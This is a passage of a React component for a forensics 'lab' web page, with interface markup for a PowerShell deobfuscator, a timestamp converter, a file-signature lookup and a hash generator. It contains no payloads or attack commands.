                        <div className="absolute -inset-2 bg-red-500/20 rounded-full blur-md animate-pulse"></div>
                        <Terminal className="relative h-8 w-8 text-red-400" />
                      </motion.div>
                      <h2 className="text-2xl font-bold">PowerShell Deobfuscator</h2>
                    </div>
                    <p className="text-gray-300 mb-8 max-w-3xl">
                      Analyze and deobfuscate malicious PowerShell commands. Supports Base64 decoding, string concatenation resolution,
                      character code conversion, and highlights suspicious patterns commonly used in attacks.
                    </p>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
                      {/* Input */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-red-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Obfuscated PowerShell</h3>
                          </div>
                          <div className="flex gap-2">
                            <motion.button
                              whileHover={{ scale: 1.05 }}
                              whileTap={{ scale: 0.95 }}
                              onClick={loadPsSample}
                              className="px-3 py-1 text-xs bg-orange-500/20 text-orange-400 border border-orange-500/30 rounded hover:bg-orange-500/30 transition"
                              type="button"
                            >
                              Load Sample
                            </motion.button>
                            <motion.button
                              whileHover={{ rotate: 90 }}
                              onClick={() => setPsInput("")}
                              title="Clear input"
                              className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white"
                              type="button"
                            >
                              <RotateCcw className="w-4 h-4" />
                            </motion.button>
                          </div>
                        </div>
                        <textarea
                          value={psInput}
                          onChange={(e) => setPsInput(e.target.value)}
                          placeholder="Paste obfuscated PowerShell code here..."
                          className="w-full h-64 bg-gray-800/50 border border-red-500/30 rounded-lg p-4 font-mono text-sm text-white placeholder-gray-400 resize-none focus:outline-none focus:ring-2 focus:ring-red-500/50 transition"
                          spellCheck={false}
                        />
                        <div className="text-xs text-gray-400 mt-2">
                          Characters: {psInput.length}
                        </div>
                      </motion.div>

                      {/* Output */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-green-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Deobfuscated Result</h3>
                          </div>
                          <motion.button
                            whileHover={{ scale: 1.1 }}
                            whileTap={{ scale: 0.9 }}
                            onClick={() => copyToClipboard(psOutput.replace(/<[^>]*>/g, ""))}
                            title="Copy to clipboard"
                            disabled={!psOutput}
                            className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            <Copy className="w-4 h-4" />
                          </motion.button>
                        </div>
                        <div className="w-full h-64 bg-gray-800/30 border border-green-500/30 rounded-lg p-4 overflow-auto font-mono text-sm whitespace-pre-wrap text-white">
                          {psOutput ? (
                            <div dangerouslySetInnerHTML={{ __html: psOutput }} />
                          ) : (
                            "Deobfuscated output will appear here..."
                          )}
                        </div>
                        <div className="text-xs text-gray-400 mt-2">
                          Characters: {psOutput.replace(/<[^>]*>/g, "").length}
                        </div>
                      </motion.div>
                    </div>

                    <div className="flex justify-center gap-6">
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={deobfuscatePowerShell}
                        disabled={!psInput.trim()}
                        className="bg-gradient-to-r from-red-500 to-orange-500 px-8 py-4 rounded-xl font-semibold shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                      >
                        <Terminal className="w-5 h-5" /> Deobfuscate PowerShell
                      </motion.button>
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={handlePsClear}
                        className="border border-gray-600 px-8 py-4 rounded-xl font-semibold hover:bg-gray-800/50 transition-colors flex items-center gap-2"
                      >
                        <RotateCcw className="w-5 h-5" /> Clear
                      </motion.button>
                    </div>
                  </div>
                )}

                {/* Timestamp Converter Section */}
                {activeTab === 'timestamp' && (
                  <div className="relative group rounded-xl p-8 border border-green-500/30 bg-gray-900/80 backdrop-blur-sm mb-16">
                    <div className="absolute inset-0 bg-gradient-to-r from-green-500/10 to-emerald-500/10 rounded-xl blur-xl -z-10"></div>
                    <div className="flex items-center gap-4 mb-6">
                      <motion.div
                        whileHover={{ rotate: 15 }}
                        className="relative"
                      >
                        <div className="absolute -inset-2 bg-green-500/20 rounded-full blur-md animate-pulse"></div>
                        <Clock className="relative h-8 w-8 text-green-400" />
                      </motion.div>
                      <h2 className="text-2xl font-bold">Timestamp Converter</h2>
                    </div>
                    <p className="text-gray-300 mb-8 max-w-3xl">
                      Convert Unix epoch timestamps (seconds or milliseconds) to human-readable date/time format and vice versa.
                      Essential for forensic timeline analysis and log correlation.
                    </p>

                    <div className="mb-6 max-w-sm">
                      <select
                        value={timestampMode}
                        onChange={(e) =>
                          setTimestampMode(e.target.value as "epoch-to-date" | "date-to-epoch")
                        }
                        className="w-full bg-gray-800/50 border border-green-500/50 rounded-lg p-3 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-green-400 transition"
                      >
                        <option value="epoch-to-date">Epoch → Date/Time (ISO 8601)</option>
                        <option value="date-to-epoch">Date/Time → Epoch (seconds)</option>
                      </select>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-6">
                      {/* Input */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-green-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Input</h3>
                          </div>
                          <div className="flex gap-2">
                            <motion.button
                              whileHover={{ scale: 1.05 }}
                              whileTap={{ scale: 0.95 }}
                              onClick={loadTimestampSample}
                              className="px-3 py-1 text-xs bg-green-500/20 text-green-400 border border-green-500/30 rounded hover:bg-green-500/30 transition"
                              type="button"
                            >
                              Load Sample
                            </motion.button>
                            <motion.button
                              whileHover={{ rotate: 90 }}
                              onClick={() => setTimestampInput("")}
                              title="Clear input"
                              className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white"
                              type="button"
                            >
                              <RotateCcw className="w-4 h-4" />
                            </motion.button>
                          </div>
                        </div>
                        <input
                          type="text"
                          value={timestampInput}
                          onChange={(e) => setTimestampInput(e.target.value)}
                          placeholder={
                            timestampMode === "epoch-to-date"
                              ? "Enter epoch timestamp (e.g., 1708023332)"
                              : "Enter date/time string (e.g., 2025-07-02T15:35:32Z)"
                          }
                          className="w-full bg-gray-800/50 border border-green-500/50 rounded-lg p-3 font-mono text-sm text-white focus:outline-none focus:ring-2 focus:ring-green-400 transition"
                        />
                      </motion.div>

                      {/* Output */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-green-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Output</h3>
                          </div>
                          <motion.button
                            whileHover={{ scale: 1.1 }}
                            whileTap={{ scale: 0.9 }}
                            onClick={() => copyToClipboard(timestampOutput)}
                            disabled={!timestampOutput}
                            title="Copy to clipboard"
                            className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            <Copy className="w-4 h-4" />
                          </motion.button>
                        </div>
                        <textarea
                          readOnly
                          value={timestampOutput}
                          placeholder="Output will appear here..."
                          className="w-full h-28 bg-gray-800/30 border border-green-500/30 rounded-lg p-4 font-mono text-sm resize-none text-white"
                        />
                      </motion.div>
                    </div>

                    <div className="flex justify-center gap-6">
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={convertTimestamp}
                        disabled={!timestampInput.trim()}
                        className="bg-gradient-to-r from-green-500 to-emerald-500 px-8 py-4 rounded-xl font-semibold shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                        type="button"
                      >
                        <Play className="w-5 h-5" /> Convert
                      </motion.button>
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={handleTimestampClear}
                        className="border border-gray-600 px-8 py-4 rounded-xl font-semibold hover:bg-gray-800/50 transition-colors flex items-center gap-2"
                        type="button"
                      >
                        <RotateCcw className="w-5 h-5" /> Clear
                      </motion.button>
                    </div>
                  </div>
                )}

                {/* File Signature / Magic Bytes Lookup */}
                {activeTab === 'signature' && (
                  <div className="relative group rounded-xl p-8 border border-purple-500/30 bg-gray-900/80 backdrop-blur-sm mb-16">
                    <div className="absolute inset-0 bg-gradient-to-r from-purple-500/10 to-indigo-500/10 rounded-xl blur-xl -z-10"></div>
                    <div className="flex items-center gap-4 mb-6">
                      <motion.div
                        whileHover={{ rotate: 15 }}
                        className="relative"
                      >
                        <div className="absolute -inset-2 bg-purple-500/20 rounded-full blur-md animate-pulse"></div>
                        <FileSignature className="relative h-8 w-8 text-purple-400" />
                      </motion.div>
                      <h2 className="text-2xl font-bold">File Signature / Magic Bytes Lookup</h2>
                    </div>
                    <p className="text-gray-300 mb-8 max-w-3xl">
                      Identify file types by their hex signature (magic bytes). Enter the first bytes of a file in hex (e.g. 25504446 for PDF).
                    </p>

                    <div className="mb-6 max-w-sm">
                      <input
                        type="text"
                        value={hexInput}
                        onChange={(e) => setHexInput(e.target.value)}
                        placeholder="Enter hex bytes (e.g. 25504446)"
                        className="w-full bg-gray-800/50 border border-purple-500/50 rounded-lg p-3 font-mono text-sm text-white focus:outline-none focus:ring-2 focus:ring-purple-400 transition"
                      />
                    </div>

                    <div className="mb-6 flex gap-4">
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={lookupFileSignature}
                        disabled={!hexInput.trim()}
                        className="bg-gradient-to-r from-purple-500 to-indigo-500 px-8 py-4 rounded-xl font-semibold shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                        type="button"
                      >
                        <Search className="w-5 h-5" /> Lookup
                      </motion.button>
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={handleSignatureClear}
                        className="border border-gray-600 px-8 py-4 rounded-xl font-semibold hover:bg-gray-800/50 transition-colors flex items-center gap-2"
                        type="button"
                      >
                        <RotateCcw className="w-5 h-5" /> Clear
                      </motion.button>
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={loadSignatureSample}
                        className="border border-purple-500 text-purple-500 px-8 py-4 rounded-xl font-semibold hover:bg-purple-600 hover:text-white transition flex items-center gap-2"
                        type="button"
                      >
                        Load Sample
                      </motion.button>
                    </div>

                    <motion.div
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xl font-semibold text-purple-400 min-h-[3rem]"
                    >
                      {signatureResult ? (
                        <motion.span
                          initial={{ opacity: 0 }}
                          animate={{ opacity: 1 }}
                          className="inline-block"
                        >
                          {signatureResult}
                        </motion.span>
                      ) : (
                        "File type will appear here."
                      )}
                    </motion.div>
                  </div>
                )}

                {/* Hash Generator Section */}
                {activeTab === 'hash' && (
                  <div className="relative group rounded-xl p-8 border border-yellow-500/30 bg-gray-900/80 backdrop-blur-sm mb-16">
                    <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/10 to-amber-500/10 rounded-xl blur-xl -z-10"></div>
                    <div className="flex items-center gap-4 mb-6">
                      <motion.div
                        whileHover={{ rotate: 15 }}
                        className="relative"
                      >
                        <div className="absolute -inset-2 bg-yellow-500/20 rounded-full blur-md animate-pulse"></div>
                        <HashIcon className="relative h-8 w-8 text-yellow-400" />
                      </motion.div>
                      <h2 className="text-2xl font-bold">Hash Generator</h2>
                    </div>
                    <p className="text-gray-300 mb-8 max-w-3xl">
                      Generate cryptographic hashes from text input. Supported algorithms: SHA-1, SHA-256, and SHA-512.
                    </p>

                    <div className="mb-6 max-w-sm">
                      <select
                        value={hashType}
                        onChange={(e) => setHashType(e.target.value)}
                        className="w-full bg-gray-800/50 border border-yellow-500/50 rounded-lg p-3 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-yellow-400 transition"
                      >
                        <option value="sha1">SHA-1</option>
                        <option value="sha256">SHA-256</option>
                        <option value="sha512">SHA-512</option>
                      </select>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-6">
                      {/* Input */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-yellow-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Input</h3>
                          </div>
                          <div className="flex gap-2">
                            <motion.button
                              whileHover={{ scale: 1.05 }}
                              whileTap={{ scale: 0.95 }}
                              onClick={loadHashSample}
                              className="px-3 py-1 text-xs bg-yellow-500/20 text-yellow-400 border border-yellow-500/30 rounded hover:bg-yellow-500/30 transition"
                              type="button"
                            >
                              Load Sample
                            </motion.button>
                            <motion.button
                              whileHover={{ rotate: 90 }}
                              onClick={() => setHashInput("")}
                              title="Clear input"
                              className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white"
                              type="button"
                            >
                              <RotateCcw className="w-4 h-4" />
                            </motion.button>
                          </div>
                        </div>
                        <textarea
                          value={hashInput}
                          onChange={(e) => setHashInput(e.target.value)}
                          placeholder="Enter text to hash..."
                          className="w-full h-64 bg-gray-800/50 border border-yellow-500/30 rounded-lg p-4 font-mono text-sm text-white placeholder-gray-400 resize-none focus:outline-none focus:ring-2 focus:ring-yellow-400 transition"
                          spellCheck={false}
                        />
                      </motion.div>

                      {/* Output */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-yellow-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Hash Output</h3>
                          </div>
                          <motion.button
                            whileHover={{ scale: 1.1 }}
                            whileTap={{ scale: 0.9 }}
                            onClick={() => copyToClipboard(hashOutput)}
                            disabled={!hashOutput}
                            title="Copy to clipboard"
                            className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            <Copy className="w-4 h-4" />
                          </motion.button>
                        </div>
                        <textarea
                          readOnly
                          value={hashOutput}
                          placeholder="Hash will appear here..."
                          className="w-full h-64 bg-gray-800/30 border border-yellow-500/30 rounded-lg p-4 font-mono text-sm resize-none text-yellow-400"
                          spellCheck={false}
                        />
                      </motion.div>
                    </div>

                    <div className="flex justify-center gap-6">
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={generateHash}
                        disabled={!hashInput.trim() || isHashing}
                        className="bg-gradient-to-r from-yellow-500 to-amber-500 px-8 py-4 rounded-xl font-semibold shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                        type="button"
                      >
                        {isHashing ? (
                          <>
                            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            Hashing...
                          </>
                        ) : (
                          <>
                            <HashIcon className="w-5 h-5" /> Generate Hash
                          </>
                        )}
                      </motion.button>
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={handleHashClear}
                        className="border border-gray-600 px-8 py-4 rounded-xl font-semibold hover:bg-gray-800/50 transition-colors flex items-center gap-2"
                        type="button"
                      >
                        <RotateCcw className="w-5 h-5" /> Clear
                      </motion.button>
                    </div>
                  </div>
                )}
              </motion.div>
            </AnimatePresence>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default TheLabPage;
